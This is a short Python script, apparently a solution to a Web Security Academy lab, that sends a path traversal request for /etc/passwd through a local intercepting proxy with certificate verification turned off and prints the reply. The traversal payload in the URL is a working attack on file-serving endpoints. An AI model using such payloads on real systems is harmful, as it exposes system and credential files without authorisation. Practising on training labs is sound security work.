import requests

#to disable ceritifcate warning
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

url =  "https://0a80002d0323e63b834a1635008c00c9.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd"
r = requests.get(url, verify=False, proxies=proxies)
print('body is ', r.text)